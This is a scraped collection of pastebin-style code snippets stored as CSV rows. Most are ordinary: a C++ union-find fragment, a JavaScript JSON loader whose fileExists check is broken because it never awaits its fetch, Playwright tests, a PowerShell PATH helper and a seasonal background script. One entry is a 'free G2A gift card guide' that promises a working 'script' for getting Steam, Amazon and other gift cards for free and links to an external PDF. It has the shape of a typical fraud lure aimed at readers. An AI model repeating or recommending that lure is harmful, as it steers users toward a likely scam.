        cout << ""-1"" << nl;
        continue;
      }

      union_sets(x, y);
    } else if(c == 2) {
      if(is_friends(x, y)) {
        cout << ""-1"" << nl;
        continue;
      }

      union_enemies(x, y);
    } else if(c == 3) {
      cout << is_friends(x, y) << nl;
    } else {
      cout << is_enemies(x, y) << nl;
    }
  }

  exit(0);
}"
N8JeMzUw,üéÅ G2A.COM FREE GIFT CARD GUIDE JUN 2024 V2 üéÅ,BitcoinScript2020,GetText,Tuesday 25th of June 2024 05:43:44 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view


Working as of:
26 June 2024"
6HFqV4b1,Roe2Js :: loadJSON ( ),jargon,JavaScript,Tuesday 25th of June 2024 05:41:12 PM CDT,"// Function to load JSON
function loadJSON(url) {

	if(basename(url) === `[object Promise].json`){
		return false;
	}
	
	// Ensure the URL starts with the host
	if ( !url.startsWith( host ) ) {
		url = `${host}${url}`;
	}
			
	// Replace spaces with %20
	url = url.replace(/ /g, '%20');
	
	let originalRequest = ``;
	
	let addy = ``;
	
	if(instr(url,`//`)){
		addy = url.split(`//`)[1];
	}else{
		addy = url;
	}
	
	addy = addy.split(`/`);
	let addy2 = ``;
	for(index = 1; index < addy.length - 1; index++){
		if(addy[index]!==``){
			addy2 += `/${addy[index]}`;
		}
	}
	
	addy3 = addy2.split(`/`);
	
	let nestRequest = ``;
	
	for(index = 2; index <= 2; index++){
		nestRequest += `/${addy3[index]}`;
	}

	for(index = 3; index < addy.length; index++){
		originalRequest += `/${addy[index]}`;
	}
	let requestPath=`${addy[0]}`;

	// Fetch the JSON file
	return fetch(url)
		.then(response => {
			if (!response.ok) {
				throw new Error(`Oh, Noez!! It was a bad network response\n\nunder ""${nestRequest}"" in ""${originalRequest}"" (${response.statusText})\n\n`);
			}
			return response.json();
		})
		.then(data => {
			console.log(`Woot!! Data fetched!\n\nunder ""${nestRequest}"" in ""${originalRequest}""\n\n`, data);
			return data;
		})
		.catch(error => {
			console.error(`Oh, Noez!! There has been a problem with your fetch operation!\n\nunder ""${nestRequest}"" in ""${originalRequest}""\n\n`, error);
		});
}

function fileExists(url) {

	// Ensure the URL starts with the host
	if ( !url.startsWith( host ) ) {
		url = `${host}${url}`;
	}
			
	// Replace spaces with %20
	url = url.replace(/ /g, '%20');

    try {
        const response = fetch(url, { method: 'HEAD' });
        return response.status === 200;
    } catch (error) {
        console.error(`Oh, Noez!! Error fetching the file!\n\n""${url}""`, error);
        return false;
    }
}

function basename(path) {
  return path.split('/').pop().split('\\').pop();
}
"
zt9uYPup,Untitled,mtsonkova,JavaScript,Tuesday 25th of June 2024 05:39:56 PM CDT,"const { test, describe, beforeEach, afterEach, beforeAll, afterAll, expect } = require('@playwright/test');
const { chromium } = require('playwright');

const host = 'http://localhost:3000'; // Application host (NOT service host - that can be anything)

let browser;
let context;
let page;

let user = {
    email: """",
    password: ""123456"",
    confirmPass: ""123456"",
};

let homeUrl = host + '/';


describe(""e2e tests"", () => {
    beforeAll(async () => {
        browser = await chromium.launch();
    });

    afterAll(async () => {
        await browser.close();
    });

    beforeEach(async () => {
        context = await browser.newContext();
        page = await context.newPage();
    });

    afterEach(async () => {
        await page.close();
        await context.close();
    });


    describe(""authentication"", () => {
        test('Register with valid data', async () => {
            //arange
            await page.goto(host);
            await page.click('text=Register');
            await page.waitForSelector('form');

            let random = Math.floor(Math.random() * 10000);
            user.email = `email${random}@abv.bg`;

            //act
            await page.locator('#email').fill(user.email);
            await page.locator('#password').fill(user.password);
            await page.locator('#repeat-pass').fill(user.confirmPass);

            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes('/users/register') && response.status() == 200),
                page.click('[type=""submit""]')
            ]);

            //assert
            await expect(response.ok()).toBeTruthy();

            let userData = await response.json();

            await expect(userData.email).toBe(user.email);
            await expect(userData.password).toBe(user.password);
        });

        test('Login with valid data', async () => {
            // arange
            await page.goto(host);
            await page.click('text=Login');
            await page.waitForSelector('form');

            //act
            await page.locator('#email').fill(user.email);
            await page.locator('#password').fill(user.password);

            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes('/users/login') && response.status() == 200),
                page.click('[type=""submit""]')
            ]);

            //assert
            await expect(response.ok()).toBeTruthy();

            let userData = await response.json();

            await expect(userData.email).toBe(user.email);
            await expect(userData.password).toBe(user.password);

        });

        test('Logout from the application', async () => {
            //arrange

            await page.goto(host);
            await page.click('text=Login');
            await page.waitForSelector('form');
            await page.locator('#email').fill(user.email);
            await page.locator('#password').fill(user.password);
            await page.click('[type=""submit""]');

            //act
            let [response] = await Promise.all([
                page.waitForResponse(response => response.url().includes('/users/logout') && response.status() == 204),
                page.click('text=Logout')
            ]);

            //assert
            await expect(response.ok()).toBeTruthy();
            await page.waitForSelector('text=Login');
            await expect(page.url()).toBe(homeUrl);

        });

    })

    describe(""navbar"", () => {
        test('Test the navbar for guest user', async () => {
            //arrange
            await page.goto(host);

            //assert
            await expect(page.locator('nav >> text=Dashboard')).toBeVisible;
            await expect(page.locator('nav >> text=My Books')).toBeHidden;
            await expect(page.locator('nav >> text=Add Book')).toBeHidden;
            await expect(page.locator('nav >> text=Logout')).toBeHidden;
            await expect(page.locator('nav >> text=Login')).toBeVisible;
            await expect(page.locator('nav >> text=Register')).toBeVisible;
        });

    });

    test('Test navbar for Logged-in user', async () => {
        //arrange
        await page.goto(host);

        //act
        await page.click('text=Login');
        await page.waitForSelector('form');
        await page.locator('#email').fill(user.email);
        await page.locator('#password').fill(user.password);
        await page.click('[type=""submit""]');

        //assert
        await expect(page.locator('nav >> text=Dashboard')).toBeVisible;
        await expect(page.locator('nav >> text=My Books')).toBeVisible;
        await expect(page.locator('nav >> text=Add Book')).toBeVisible;
        await expect(page.locator('nav >> text=Logout')).toBeVisible;
        await expect(page.locator('nav >> text=Login')).toBeHidden;
        await expect(page.locator('nav >> text=Register')).toBeHidden;
    });
});

describe(""CRUD"", () => {
    beforeEach(async () => {

        await page.goto(host);

        await page.click('text=Login');
        await page.waitForSelector('form');
        await page.locator('#email').fill(user.email);
        await page.locator('#password').fill(user.password);
        await page.click('[type=""submit""]');
    });

    test('Test Create a book functionality', async () => {
        //arrange
        await page.click('text=Add Book');
        await page.waitForSelector('form');

        //act

        await page.locator('#title').fill('Random Title');
        await page.locator('#description').fill('Random description');
        await page.locator('#imageUrl').fill('image.jpg');
        await page.locator('#type').selectOption('Other');

        //act
        let [response] = await Promise.all([
            page.waitForResponse(response => response.url().includes('/data/books') && response.status() == 200),
            page.click('[type=""Submit""]')
        ]);

        let bookData = await response.json();

        //assert
        await expect(response.ok()).toBeTruthy();
        await expect(bookData.title).toBe('Random Title');
        await expect(bookData.description).toBe('Random description');
        await expect(bookData.imageUrl).toBe('image.jpg');
        await expect(bookData.type).toBe('Other');
    });

    test('Edit a book functionality', async () => {
        //arrange
        await page.click('text=My Books');
        await page.locator('text=Details').first().click();
        await page.click('text=Edit');
        await page.waitForSelector('form');

        //act
        await page.locator('#title').fill('Edited Random Title');
        await page.locator('#description').fill('Edited Random description');
        await page.locator('#type').selectOption('Other');
        let [response] = await Promise.all([
            page.waitForResponse(response => response.url().includes('/data/books') && response.status() == 200),
            page.click('[type=""Submit""]')
        ]);

        let bookData = await response.json();

        //assert
        await expect(response.ok()).toBeTruthy();
        await expect(bookData.title).toBe('Edited Random Title');
        await expect(bookData.description).toBe('Edited Random description');
        await expect(bookData.imageUrl).toBe('image.jpg');
        await expect(bookData.type).toBe('Other');
    })

    test('Delete a book functionality', async () => {
        await page.click('text=My Books');
        await page.locator('text=Details').first().click();
        await page.click('text=Delete');

        let [response] = await Promise.all([
            page.waitForResponse(response => response.url().includes('/data/books') && response.status() == 200),
            page.click('text=Delete')
        ]);

        await expect(response.ok()).toBeTruthy();

    })

});
"
6fsPxCFj,PowerShell 'Refresh-Path' function,justinooo,PowerShell,Tuesday 25th of June 2024 04:10:40 PM CDT,"function Refresh-Path {
    $global:env:Path = [System.Environment]::GetEnvironmentVariable(""Path"", ""Machine"") + "";"" + [System.Environment]::GetEnvironmentVariable(""Path"", ""User"")
    Write-Output ""PATH refreshed.""
}"
mezsgGXq,Untitled,swaggboi,JavaScript,Tuesday 25th of June 2024 04:00:36 PM CDT,"const bodyStyle = document.body.style;

function setImage(url) {
    bodyStyle.backgroundImage = ""url('"" + url + ""')"";
}

switch (new Date().getMonth()) {
    case 5: // Just to test for now
        setImage('/images/topwwbackground.gif');
        break;
    case 9:
        setImage('/images/halloween_background_1.gif');
        break;
    case 11:
        setImage('/images/christmas.gif');
        break;
}
"
